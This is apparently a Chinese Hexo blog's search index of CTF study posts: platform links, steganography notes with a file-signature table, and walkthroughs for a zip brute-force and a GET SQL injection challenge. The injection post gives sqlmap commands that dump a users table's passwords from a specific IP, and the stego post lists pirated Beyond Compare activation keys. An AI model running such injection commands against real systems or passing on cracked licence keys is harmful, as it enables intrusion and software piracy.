<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctf网站资料</title>
      <link href="/2023/11/06/ctf%E8%B5%84%E6%96%99/"/>
      <url>/2023/11/06/ctf%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<h4 id="ctf网站资料"><a href="#ctf网站资料" class="headerlink" title="ctf网站资料"></a>ctf网站资料</h4><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><h5 id="一些在线ctf竞赛平台"><a href="#一些在线ctf竞赛平台" class="headerlink" title="一些在线ctf竞赛平台"></a>一些在线ctf竞赛平台</h5><p>tidesecctf <a href="http://ctf.tidesec.com/">http://ctf.tidesec.com/</a><br>攻防世界 <a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a><br>buuctf <a href="https://buuoj.cn/">https://buuoj.cn/</a><br>bugku <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a><br>ctfhub <a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a><br>浙大ctf <a href="https://www.jarvisoj.com/">https://www.jarvisoj.com/</a><br>狼组团队ctf <a href="https://ctf.wgpsec.org/">https://ctf.wgpsec.org/</a><br>pwnhub <a href="https://pwnhub.cn/">https://pwnhub.cn/</a><br>ctfshow <a href="https://ctf.show/">https://ctf.show/</a><br>nssctf <a href="https://www.nssctf.cn/">https://www.nssctf.cn/</a><br>看雪ctf <a href="https://ctf.kanxue.com/">https://ctf.kanxue.com/</a><br>青少年ctf <a href="https://www.qsnctf.com/">https://www.qsnctf.com/</a></p><h5 id="github一些师傅收集的题目"><a href="#github一些师傅收集的题目" class="headerlink" title="github一些师傅收集的题目"></a>github一些师傅收集的题目</h5><p><a href="https://github.com/ctfs">https://github.com/ctfs</a><br><a href="https://github.com/fangdada/ctf">https://github.com/fangdada/ctf</a><br><a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a><br><a href="https://github.com/Drun1baby/CTFReposityStore-2022/">https://github.com/Drun1baby/CTFReposityStore-2022/</a><br><a href="https://github.com/ctfwiki/ctf_game_history">https://github.com/ctfwiki/ctf_game_history</a><br><a href="https://github.com/hongriSec/CTF-Training">https://github.com/hongriSec/CTF-Training</a><br><a href="https://github.com/Firebasky/ctf-Challenge">https://github.com/Firebasky/ctf-Challenge</a><br><a href="https://github.com/securebluefox/CTF_competition_warehouse_2019">https://github.com/securebluefox/CTF_competition_warehouse_2019</a><br><a href="https://github.com/skyedai910/CTF-GAME-COLLECTION-2021">https://github.com/skyedai910/CTF-GAME-COLLECTION-2021</a><br><a href="https://github.com/CTFTraining/CTFTraining">https://github.com/CTFTraining/CTFTraining</a><br><a href="https://github.com/securebluefox/CTF_competition_warehouse_2020_First">https://github.com/securebluefox/CTF_competition_warehouse_2020_First</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/11/01/typora/"/>
      <url>/2023/11/01/typora/</url>
      
        <content type="html"><![CDATA[<h1 id="typora"><a href="#typora" class="headerlink" title="typora"></a>typora</h1><h2 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/27/CTF%E9%9A%90%E5%86%99/"/>
      <url>/2023/10/27/CTF%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF隐写"><a href="#CTF隐写" class="headerlink" title="CTF隐写"></a>CTF隐写</h1><p>CTF隐写术知识点总结</p><p>0x01 目录</p><p><strong>图片隐写常用方法:</strong></p><p>1.附加式的图片隐写</p><p>（</p><p>2.基于文件结构的图片隐写</p><p>（1）PNG图片结构</p><p>（3）IDAT块隐写</p><p>3.基于LSB原理的图片隐写</p><p>（1）简单的LSB隐写</p><p>4.基于DCT域的JPG图片隐写</p><p>（1）背景知识</p><p>（2）Stegdetect简介</p><p>（3）JPHS提取</p><p>（4）Outguess提取</p><p>5.数字水印的隐写</p><p>（1）背景知识</p><p>（2）频域盲水印隐写</p><p>6.图片容差的隐写</p><p>（1）背景知识</p><p>（2）容差比较的隐写</p><p>7.二维码隐写</p><p>（1）QR Research解码</p><p><strong>电子文档隐写：</strong></p><p>1.Word文件隐写</p><p>2.PDF文件隐写</p><p><strong>多媒体文件隐写:</strong></p><p>1.音频隐写</p><p>2.视频隐写</p><p><strong>常用文件头尾标识：</strong></p><p>1.常用文件头尾标识</p><p>2.文件头标识及对应类型表</p><p>0x02 正文</p><p>图片隐写常用方法：</p><p><strong>一、附加式的图片隐写：</strong></p><p><strong>二、基于文件结构的图片隐写：</strong></p><p><strong>1.PNG图片结构：</strong></p><p>标准的PNG文件结构包括：PNG文件标识和PNG数据块。 PNG图片文件结构：</p><ul><li><p>（固定）8字节89 50 4E 47 0D 0A 1A 0A为png文件头；</p></li><li><p>（固定）4字节00 00 00 0D（即十进制的13）代表数据块的长度为13；</p></li><li><p>（固定）4字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标识（IDCH）；</p></li><li><p>（可变）13位数据块（IHDR)</p></li><li><p>前四个字节代表该图片的宽</p></li><li><p>后四个字节代表该图片的高</p></li><li><p>后五个字节依次为：</p></li></ul><p>Bit depth、ColorType、Compression method、Filter method、Interlace method</p><ul><li>（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。</li></ul><p>PNG图片文件头数据块（IHDR）包括：宽、高、图像深度、颜色类型、压缩方法等（图中蓝色的部分即IHDR数据块）。</p><p><strong>2.修改高度隐写：</strong></p><p>先用TweakPNG打开图片，一般修改过长宽的图片都会报错。</p><p>找到PNG图片高度值所对应的位置，并修改为一个较大的值，尝试打开。</p><p>修改01 00为02 00，并保存后打开。</p><p>修改宽高之后的PNG图片可能打不开，需要修复PNG图片的CRC校验值。</p><p>方法：</p><p>选中PNG的struct IHDR Ihdr部分(图中蓝色部分)，使用CRC Calculator重新计算CRC校验值。</p><p>将struct IHDR Ihdr的CRC（图中蓝色部分）修改为重新计算过的CRC。</p><p>再用TweakPNG打开图片不报错，修复成功。</p><p><strong>3.IDAT块的隐写：</strong></p><p>PNGCheck可以验证PNG图片的完整性（通过检查内部CRC-32校验和&bra;比特&ket;)和解压缩图像数据，它能够转储几乎所有任选的块级别信息在该</p><p>图像中的可读数据。</p><p>查询命令：</p><p>pngcheck -v xxx.png</p><p><strong>三、基于LSB原理的图片隐写：</strong></p><ol><li><strong>简单的LSB隐写：</strong></li></ol><p>利用LSB（最低有效位 (Least Significant Bit)来进行隐写。例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的</p><p>1bit，人眼无法区别。例如我们想把A隐藏进来的话，可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二</p><p>进制串。</p><p>分离方法：</p><p>Stegsolve分离：</p><p>使用Stegsolve—Analyse—Frame Browser，可以浏览三个颜色通道中的每一位。</p><p>PS：</p><p>此种隐写的载体一般为png或bmp格式，jpg的有损压缩方式会破坏隐写的内容。</p><p><strong>五、数字水印的隐写：</strong></p><p><strong>1.背景知识：</strong></p><p>数字水印：</p><p>数字水印（digital watermark）技术，是指在数字化的数据内容中嵌入不明显的记号。</p><p>特征是，被嵌入的记号通常是不可见或不可察的，但是可以通过计算操作检测或者提取。</p><p>盲水印与傅里叶变换：</p><p>盲水印，是指人感知不到的水印，包括看不到或听不见（没错，数字盲水印也能够用于音频）。其主要应用于音像作品、数字图书等，目的是，在不破</p><p>坏原始作品的情况下，实现版权的防护与追踪。</p><p>对图像进行傅里叶变换，起始是一个二维离散傅里叶变换，图像的频率是指图像灰度变换的强烈程度，将二维图像由空间域变为频域后，图像上的每</p><p>个点的值都变成了复数，也就是所谓的复频域，通过复数的实部和虚部，可以计算出幅值和相位，计算幅值即对复数取模值，将取模值后的矩阵显示</p><p>出来，即为其频谱图。但是问题来了，复数取模后，数字有可能变的很大，远大于255，如果数据超过255，则在显示图像的时候会都当做255来处理，</p><p>图像就成了全白色。因此，一般会对模值再取对数，在在0~255的范围内进行归一化，这样才能够准确的反映到图像上，发现数据之间的差别，区分</p><p>高频和低频分量，这也是进行傅里叶变换的意义。</p><ol><li><strong>频域盲水印隐写：</strong></li></ol><p>分离方法：</p><p>Blind-watermark（python 2.7）：</p><p>分离水印命令：</p><p>python decode.py –original <original image file> –image <image file> –result <result file></p><p>添加水印命令：</p><p>python encode.py –image <image file> –watermark <watermark file> –result <result file></p><p><strong>六、图片容差隐写：</strong></p><p><strong>1.背景知识：</strong></p><p>容差，在选取颜色时所设置的选取范围，容差越大，选取的范围也越大，其数值是在0-255之间。</p><p><strong>2.容差比较的隐写：</strong></p><p>分离方法：</p><p>beyond compare分离：</p><p>操作步骤：</p><p>打开工具，选择图片比较，导入example_1.jpg和example_2.jpg。</p><p>选择容差模式，并调整容差大小</p><p>PS：</p><p>Beyond Compare4|Beyond Compare破解版激活码：</p><p>1、L2aJTd2SauPv4Luhang21uqq5NJOEw94wxdZTpU-pFB9GmyPk677gJ</p><p>2、RuGuo7nimugASTzh99xsaioxTsE2-oigiuomj+JHFjazxsaoh43kmplmjx</p><p>3、hFbqTmYskatMTgPyjvv99CF2Te8ec+Ys6PPxyZAF0YwOGUILOO98iug</p><p><strong>七、二维码隐写：</strong></p><p><strong>1.QR Research解码：</strong></p><p>使用QR Research读取二维码中的信息。</p><p>电子文档隐写：</p><p><strong>一、Word文件隐写：</strong></p><p><strong>（1）隐藏文本功能隐写：</strong></p><p>一是进入Word—文件—选项—显示—勾选“隐藏文字”。</p><p>二是使用WinHex查看十六进制数据。</p><p>（2）word文档的xml转换：</p><p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被</p><p>隐藏进其他数据。</p><p>一是将后缀名改为.zip\rar\7z等压缩格式，打开即可查看。</p><p>二是使用WinHex查看十六进制数据。</p><p><strong>二、PDF文件隐写：</strong></p><p>分离方法：</p><p>wbStego分离：</p><p>在工具目录中找到 wbStego4open，使用工具载入文档，</p><p>Step 1 是文件介绍</p><p>Step 2 中，我们选择Decode，</p><p>Step 3 我们选择目标文件</p><p>Step 4 输入加密密码，这里我是空密码，直接跳过</p><p>Step 5 为保存文件为 flag.txt</p><p>多媒体文件隐写：</p><p><strong>一、音频隐写：</strong></p><p><strong>（1）摩斯电码式：</strong></p><p>打开音频文件尝试听一下内容，会听到类似电报的发文声。</p><p>摩尔斯电码对照表：</p><p>解码方式：</p><p>用Adobe Auditon打开目标文件，并观察波形。长的代表代表横线，短的代表点，大的间隔是空格。</p><p>翻译后的密文为：</p><ul><li>..- .. .- -. –.. …. .. .-.-.- .- .-.. .. -.– ..- -. .-.-.- -.-. — –</li></ul><p><strong>（2）利用MP3stego进行的数据隐写：</strong></p><p>MP3Stego命令：</p><p>加密：encode -E 加密文本 -P 密码  wav文件 mp3文件</p><p>解密：decode -X -P  密码  mp3文件</p><p><strong>（3）频谱图的音频隐写：</strong></p><p>频谱是频率谱密度的简称，是频率的分布曲线。复杂振荡分解为振幅不同和频率不同的谐振荡，这些谐振荡的幅值按频率排列的图形叫做频谱。</p><p>在CTF中，我们可以单独只对一个声道中，隐写进信息。</p><p>分离方法：</p><p>使用Adobe Audition分离：</p><p>用AU打开音频文件，调整频谱显示，即可显示出flag。</p><p><strong>二、视频隐写：</strong></p><p>目前在CTF赛事中较为常出现的视频隐写，一般都是将一场带有隐写信息的图片，嵌入视频中，我们所需要做的就是将这个图片从视频分离出来，然</p><p>后在分析我们分离出来的文件是什么，之后的操作可能会涉及到密码编码，图片隐写等知识点。</p><p>如果单独对视频来说ffmpeg是一个很好的工具，这里我使用的是foremost，当然我们也可以使用binwalk或者dd等工具，正如我们图片隐写中教大</p><p>家分离图片所用的方法一样。区别是，ffmpeg将视频分解成一张一张的图片，foremost是一个基于文件头和尾部信息以及文件的内建数据结构恢复文</p><p>件的命令行工具。</p><p>（1）使用foremost分离：</p><p>分离命令：</p><p>foremost xxx.mp4</p><p>会自动生成output目录存放分离出文件。</p><p>（2）使用steghide分离：</p><p>分离命令：</p><p>steghide extract -sf thing.jpg -p password</p><p>常用文件头尾标识：</p><p><strong>一、常用文件头尾标识：</strong></p><p>（1）常见图片文件头尾标识：</p><p>JPEG&#x2F;JPG：</p><p>文件头标识(2 bytes)：FF D8</p><p>文件结束标识(2 bytes)：FF D9</p><p>PNG：</p><p>文件头标识(8 bytes)：89 50 4E 47 0D 0A 1A 0A</p><p>GIF：</p><p>文件头标识(6 bytes)：47 49 46 38 39(37) 61</p><p>文件结束标识(2 bytes)：01 01 00 3B</p><p>BMP：</p><p>文件头标识(2 bytes)：42 4D</p><p><strong>二、文件头标识及对应类型表：</strong></p><p>详见：<a href="http://www.cnblogs.com/13ck/p/4471146.html">http://www.cnblogs.com/13ck/p/4471146.html</a></p><table><thead><tr><th>扩展名</th><th>文件头标识（HEX）</th><th>文件描述</th></tr></thead><tbody><tr><td>7z</td><td>37 7A BC AF 27 1C</td><td>7-ZIP compressed file</td></tr><tr><td>amr</td><td>23 21 41 4D 52</td><td>Adaptive Multi-Rate ACELP (Algebraic Code Excited   Linear Prediction) Codec, commonly audio format with GSM cell phones</td></tr><tr><td>asf</td><td>30 26 B2 75 8E 66 CF 11</td><td>Windows Media</td></tr><tr><td>asf; wma; wmv</td><td>30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C</td><td>Microsoft Windows Media Audio&#x2F;Video File(Advanced   Streaming Format)</td></tr><tr><td>avi</td><td>41 56 49 20</td><td>Audio Video Interleave (AVI)</td></tr><tr><td>bmp</td><td>42 4D</td><td>Windows Bitmap</td></tr><tr><td>BMP</td><td>42 4D 3E</td><td></td></tr><tr><td>dat</td><td>3</td><td>MapInfo Native Data Format</td></tr><tr><td>dat</td><td>1A 52 54 53 20 43 4F 4D 50 52 45 53 53 45 44 20 49   4D 41 47 45 20 56 31 2E 30 1A</td><td>Runtime Software disk image</td></tr><tr><td>dat</td><td>41 56 47 36 5F 49 6E 74 65 67 72 69 74 79 5F 44 61   74 61 62 61 73 65</td><td>AVG6 Integrity database file</td></tr><tr><td>DAT</td><td>43 52 45 47</td><td>Windows 9x registry hive</td></tr><tr><td>DAT</td><td>43 6C 69 65 6E 74 20 55 72 6C 43 61 63 68 65 20 4D   4D 46 20 56 65 72 20</td><td>IE History DAT file</td></tr><tr><td>DAT</td><td>45 52 46 53 53 41 56 45 44 41 54 41 46 49 4C 45</td><td>Kroll EasyRecovery Saved Recovery State file</td></tr><tr><td>DAT</td><td>49 6E 6E 6F 20 53 65 74 75 70 20 55 6E 69 6E 73 74   61 6C 6C 20 4C 6F 67 20 28 62 29</td><td>Inno Setup Uninstall Log file</td></tr><tr><td>db</td><td>00 06 15 61 00 00 00 02 00 00 04 D2 00 00 10 00</td><td>Netscape Navigator (v4) database file</td></tr><tr><td>DB</td><td>44 42 46 48</td><td>Palm Zire photo database</td></tr><tr><td>db</td><td>8</td><td>dBASE IV or dBFast configuration file</td></tr><tr><td>doc</td><td>0D 44 4F 43</td><td>DeskMate Document file</td></tr><tr><td>doc</td><td>12 34 56 78 90 FF</td><td>MS Word 6.0</td></tr><tr><td>doc</td><td>31 BE 00 00 00 AB 00 00</td><td>MS Word for DOS 6.0</td></tr><tr><td>doc</td><td>7F FE 34 0A</td><td>MS Word</td></tr><tr><td>dot; ppt; xla; ppa; pps; pot; msi; sdw; db</td><td>D0 CF 11 E0</td><td>MS Office&#x2F;OLE2</td></tr><tr><td>doc; dot; xls; xlt; xla; ppt; apr ;ppa; pps; pot; msi;   sdw; db</td><td>D0 CF 11 E0 A1 B1 1A E1</td><td>MS Compound Document v1 or Lotus Approach APR file</td></tr><tr><td>emf</td><td>01 00 00 00 58 00 00 00</td><td>Extended (Enhanced) Windows Metafile Format, printer   spool file</td></tr><tr><td>eml</td><td>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</td><td>Email</td></tr><tr><td>EML</td><td>46 72 6F 6D 20 20 20</td><td>A commmon file extension for e-mail files.   Signatures shown here are for Netscape, Eudora, and a generic signature,   respectively. EML is also used by Outlook Express and QuickMail.</td></tr><tr><td>EML</td><td>46 72 6F 6D 20 3F 3F 3F</td><td>A commmon file extension for e-mail files.   Signatures shown here are for Netscape, Eudora, and a generic signature,   respectively. EML is also used by Outlook Express and QuickMail.</td></tr><tr><td>EML</td><td>46 72 6F 6D 3A 20</td><td>A commmon file extension for e-mail files.   Signatures shown here are for Netscape, Eudora, and a generic signature,   respectively. EML is also used by Outlook Express and QuickMail.</td></tr><tr><td>EML</td><td>52 65 63</td><td></td></tr><tr><td>exe; dll; drv; vxd; sys; ocx; vbx</td><td>4D 5A</td><td>Win32 Executable</td></tr><tr><td>exe; dll; drv; vxd; sys; ocx; vbx</td><td>4D 5A</td><td>Win16 Executable</td></tr><tr><td>exe; com; 386; ax; acm; sys; dll; drv; flt; fon; ocx;   scr; lrc; vxd; cpl; x32</td><td>4D 5A</td><td>Executable File</td></tr><tr><td>EXE, DLL, OCX, OLB, IMM, IME</td><td>4D 5A 90</td><td></td></tr><tr><td>FLV</td><td>46 4C 56 01</td><td>Flash video file</td></tr><tr><td>GIF</td><td>47 49 46 38</td><td></td></tr><tr><td>gif</td><td>47 49 46 38 37 61</td><td>Graphics interchange format file (GIF 87A)</td></tr><tr><td>gif</td><td>47 49 46 38 39 61</td><td>Graphics interchange format file (GIF89A)</td></tr><tr><td>gz; tar; tgz</td><td>1F 8B</td><td>Gzip Archive File</td></tr><tr><td>gz; tgz</td><td>1F 8B 08</td><td>GZ Compressed File</td></tr><tr><td>htm; html</td><td>3C 21 44 4F 43 54</td><td>HyperText Markup Language 3</td></tr><tr><td>htm; html</td><td>3C 48 54 4D 4C 3E</td><td>HyperText Markup Language 2</td></tr><tr><td>htm; html</td><td>3C 68 74 6D 6C 3E</td><td>HyperText Markup Language 1</td></tr><tr><td>html</td><td>68 74 6D 6C 3E</td><td>HTML</td></tr><tr><td>ico</td><td>00 00 01 00 00</td><td>Icon File</td></tr><tr><td>ico</td><td>00 00 01 00 01 00 20 20</td><td>Icon File</td></tr><tr><td>ISO</td><td>43 44 30 30 31</td><td>ISO-9660 CD Disc Image (This signature usually   occurs at byte 8001, 8801, or 9001.)</td></tr><tr><td>JAR</td><td>4A 41 52 43 53 00</td><td>JARCS compressed archive</td></tr><tr><td>jar</td><td>5F 27 A8 89</td><td>JAR Archive File</td></tr><tr><td>jpg; jpeg</td><td>FF D8 FF</td><td></td></tr><tr><td>jpg; jpe; jpeg</td><td>FF D8 FF E0 00</td><td>JPG Graphic File</td></tr><tr><td>jpg; jpe; jpeg</td><td>FF D8 FF FE 00</td><td>JPG Graphic File</td></tr><tr><td>lnk</td><td>4C 00 00 00</td><td>Windows Shortcut (Link File)</td></tr><tr><td>lnk</td><td>4C 00 00 00 01 14 02</td><td>Windows Link File</td></tr><tr><td>LNK</td><td>4C 00 00 00 01 14 02 00</td><td>Windows shortcut file</td></tr><tr><td>log</td><td>2A 2A 2A 20 20 49 6E 73 74 61 6C 6C 61 74 69 6F 6E   20 53 74 61 72 74 65 64 20</td><td>Symantec Wise Installer log file</td></tr><tr><td>m4a</td><td>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</td><td>Apple Lossless Audio Codec file</td></tr><tr><td>m4a; m4v</td><td>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</td><td>QuickTime M4A&#x2F;M4V file</td></tr><tr><td>mdb</td><td>00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20   44 42</td><td>Microsoft Access file</td></tr><tr><td>mdb; mda; mde; mdt</td><td>53 74 61 6E 64 61 72 64 20 4A</td><td>MS Access</td></tr><tr><td>MOV</td><td>00 00 0F</td><td></td></tr><tr><td>MOV</td><td>00 00 77</td><td></td></tr><tr><td>mov</td><td>6D 6F 6F 76</td><td>Quicktime</td></tr><tr><td>mov</td><td>6D 64 61 74</td><td>QuickTime Movie</td></tr><tr><td>MP3</td><td>49 44 33</td><td>MPEG-1 Audio Layer 3 (MP3) audio file</td></tr><tr><td>MP3</td><td>FF FB 50</td><td></td></tr><tr><td>mp4</td><td>00 00 00 18 66 74 79 70 33 67 70 35</td><td>MPEG-4 video files</td></tr><tr><td>mpg; mpeg</td><td>00 00 01 B3</td><td>MPEG Movie</td></tr><tr><td>mpg</td><td>00 00 01 BA</td><td>MPEG</td></tr><tr><td>PDF</td><td>25 50 44</td><td></td></tr><tr><td>pdf; fdf</td><td>25 50 44 46</td><td>Adobe Portable Document Format and Forms Document   file</td></tr><tr><td>pdf</td><td>25 50 44 46 2D 31 2E</td><td>Adobe Acrobat</td></tr><tr><td>PNG</td><td>89 50 4E</td><td></td></tr><tr><td>PNG</td><td>89 50 4E 47</td><td></td></tr><tr><td>png</td><td>89 50 4E 47 0D 0A</td><td>PNG Image File</td></tr><tr><td>png</td><td>89 50 4E 47 0D 0A 1A 0A</td><td>PNG Image File</td></tr><tr><td>PPT</td><td>D0 CF 11</td><td></td></tr><tr><td>ppt</td><td>[512 byte offset] 00 6E 1E F0</td><td>PowerPoint presentation subheader (MS Office)</td></tr><tr><td>ppt</td><td>[512 byte offset] 0F 00 E8 03</td><td>PowerPoint presentation subheader (MS Office)</td></tr><tr><td>PSD</td><td>38 42 50</td><td></td></tr><tr><td>psd</td><td>38 42 50 53</td><td>Adobe Photoshop image file</td></tr><tr><td>RAR</td><td>52 61 72</td><td></td></tr><tr><td>rar</td><td>52 61 72 21</td><td>RAR Archive File</td></tr><tr><td>reg</td><td>52 45 47 45 44 49 54 34</td><td></td></tr><tr><td>rgb</td><td>01 DA 01 01 00 03</td><td>Silicon Graphics RGB Bitmap</td></tr><tr><td>RM</td><td>2E 52 4D</td><td></td></tr><tr><td>rm; rmvb</td><td>2E 52 4D 46</td><td>Real Media streaming media file</td></tr><tr><td>SWF</td><td>43 57 53</td><td>Shockwave Flash file (v5+)</td></tr><tr><td>SWF</td><td>46 57 53</td><td>Macromedia Shockwave Flash player file</td></tr><tr><td>tar; cpio</td><td>30 37 30 37 30 37</td><td>CPIO Archive File</td></tr><tr><td>tar.z</td><td>1F 9D 90</td><td>Compressed tape archive file</td></tr><tr><td>TIF; TIFF</td><td>49 20 49</td><td>Tagged Image File Format file</td></tr><tr><td>tif; tiff</td><td>49 49 2A</td><td>TIFF (Intel)</td></tr><tr><td>tif; tiff</td><td>49 49 2A 00</td><td>Tagged Image File Format file (little endian, i.e.,   LSB first in the byte; Intel)</td></tr><tr><td>TIF; TIFF</td><td>4D 4D 00 2A</td><td>Tagged Image File Format file (big endian, i.e., LSB   last in the byte; Motorola)</td></tr><tr><td>tif; tiff</td><td>4D 4D 2A</td><td>TIFF (Motorola)</td></tr><tr><td>TIF; TIFF</td><td>4D 4D 00 2B</td><td>BigTIFF files; Tagged Image File Format files &gt;4   GB</td></tr><tr><td>VCD</td><td>45 4E 54 52 59 56 43 44 02 00 00 01 02 00 18 58</td><td>VideoVCD (GNU VCDImager) file</td></tr><tr><td>vob</td><td>00 00 01 BA</td><td>DVD Video Movie File (video&#x2F;dvd, video&#x2F;mpeg)</td></tr><tr><td>WAV</td><td>52 49 46</td><td></td></tr><tr><td>wav</td><td>57 41 56 45</td><td>Wave</td></tr><tr><td>wav</td><td>57 41 56 45 66 6D 74</td><td>Wave Files</td></tr><tr><td>WMA</td><td>30 26 B2</td><td></td></tr><tr><td>WMV</td><td>30 26 B2</td><td></td></tr><tr><td>xls</td><td>09 02 06 00 00 00 10 00 B9 04 5C 00</td><td>MS Excel v2</td></tr><tr><td>xls</td><td>09 04 06 00 00 00 10 00 F6 05 5C 00</td><td>MS Excel v4</td></tr><tr><td>XLS</td><td>D0 CF 11</td><td></td></tr><tr><td>xls</td><td>D0 CF 11 E0</td><td>MS Excel</td></tr><tr><td>xls</td><td>[512 byte offset]  09 08 10 00 00 06 05 00</td><td>Excel spreadsheet subheader (MS Office)</td></tr><tr><td>XML</td><td>3C 3F 78</td><td></td></tr><tr><td>xml</td><td>3C 3F 78 6D 6C</td><td>XML Document</td></tr><tr><td>xml</td><td>FF FE 3C 00 52 00 4F 00 4F 00 54 00 53 00 54 00 55 00   42 00</td><td>XML Document (ROOTSTUB)</td></tr><tr><td>ZIP</td><td>50 4B 03</td><td></td></tr><tr><td>zip; jar; zipx</td><td>50 4B 03 04</td><td>ZIP Archive</td></tr><tr><td>zip</td><td>50 4B 30 30</td><td>ZIP Archive (outdated)</td></tr><tr><td>Zip</td><td>50 4B 30 30 50 4B 03 04</td><td>WINZIP Compressed</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2023/10/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p>暴力破解<br>一. 关卡描述<br>1.1详细说明<br>暴力破解</p><p>二. 操作步骤<br>2.1点击题目查看描述并下载附件</p><p>2.2 查看压缩包内容，根据提示得知解压密码是6位数的数字</p><p>2.3 使用ARCHPR工具对压缩包进行爆破，即可获得解压密码：563412</p><p>2.4 使用密码：563412解开压缩包，发现有一个名为文档.docx的文件</p><p>2.5 把后缀名改为zip，并对其文件进行解压操作</p><p>2.6 在解压后的文件中，word文件夹下的 document.xml文件中存在flag值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/27/sql/"/>
      <url>/2023/10/27/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>Web安全之SQL注入</strong></p><h1 id="一-关卡描述"><a href="#一-关卡描述" class="headerlink" title="一. 关卡描述"></a>一. 关卡描述</h1><h2 id="1-1-详细说明"><a href="#1-1-详细说明" class="headerlink" title="1.1 详细说明"></a>1.1 详细说明</h2><p>GET型Sql注入</p><h1 id="二-操作步骤"><a href="#二-操作步骤" class="headerlink" title="二. 操作步骤"></a>二. 操作步骤</h1><h2 id="2-1-点击题目查看描述"><a href="#2-1-点击题目查看描述" class="headerlink" title="2.1 点击题目查看描述"></a>2.1 点击题目查看描述</h2><h2 id="2-2-访问地址：http-59-110-53-218-2003"><a href="#2-2-访问地址：http-59-110-53-218-2003" class="headerlink" title="2.2 访问地址：http://59.110.53.218:2003/"></a>2.2 访问地址：<a href="http://59.110.53.218:2003/">http://59.110.53.218:2003/</a></h2><h2 id="2-3-根据提示后得知此题为sql注入，可以用sqlmap工具来做题"><a href="#2-3-根据提示后得知此题为sql注入，可以用sqlmap工具来做题" class="headerlink" title="2.3 根据提示后得知此题为sql注入，可以用sqlmap工具来做题"></a>2.3 根据提示后得知此题为sql注入，可以用sqlmap工具来做题</h2><p>sqlmap -u “<a href="http://59.110.53.218:2003/index.php?id=1&password=1">http://59.110.53.218:2003/index.php?id=1&amp;password=1</a>“  –dbs</p><p>获取数据库名</p><p>sqlmap -u “<a href="http://59.110.53.218:2003/index.php?id=1&password=1">http://59.110.53.218:2003/index.php?id=1&amp;password=1</a>“  -D injection_db –tables</p><p>获取表名</p><p>sqlmap -u “<a href="http://59.110.53.218:2003/index.php?id=1&password=1">http://59.110.53.218:2003/index.php?id=1&amp;password=1</a>“  -D injection_db -T users –columns</p><p>获取字段名</p><p>sqlmap -u “<a href="http://59.110.53.218:2003/index.php?id=1&password=1">http://59.110.53.218:2003/index.php?id=1&amp;password=1</a>“  -D injection_db -T users -C id,num,password –dump</p><p>获取数据内容</p><p><strong>2.4 使用获取的用户名：admin，密码：ad1234进行登录，获取flag值</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/10/26/hello-world/"/>
      <url>/2023/10/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo 